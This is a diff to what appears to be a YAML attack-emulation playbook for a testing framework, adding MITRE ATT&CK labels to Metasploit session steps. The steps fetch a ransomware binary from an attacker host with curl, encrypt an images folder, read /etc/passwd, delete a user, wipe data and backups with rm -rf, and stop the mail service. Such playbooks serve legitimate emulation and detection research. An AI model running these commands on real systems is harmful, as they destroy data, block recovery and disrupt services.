@@ -144,31 +144,56 @@ commands:
   - type: msf-session
     session: movement
     cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
+    metadata:
+      techniques: "T1486"
+      tactics: "Impact"
 
   - type: msf-session
     session: movement
     cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
+    metadata:
+      techniques: "T1486,T1565"
+      tactics: "Impact"
 
   - type: msf-session
     session: movement
     cmd: find /media/data/Images
+    metadata:
+      techniques: "T1018"
+      tactics: "Discovery"
 
   - type: msf-session
     session: movement
     cmd: cat /etc/passwd
+    metadata:
+      techniques: "T1087"
+      tactics: "Discovery"
   
   - type: msf-session
     session: movement
     cmd: userdel -f john
+    metadata:
+      techniques: "T1531"
+      tactics: "Impact"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
+    metadata:
+     techniques: "T1485"
+     tactics: "Impact"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
-  
+    metadata:
+     techniques: "T1490"
+     tactics: "Impact"
+
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
+    metadata:
+     techniques: "T1489"
+     tactics: "Impact"
+
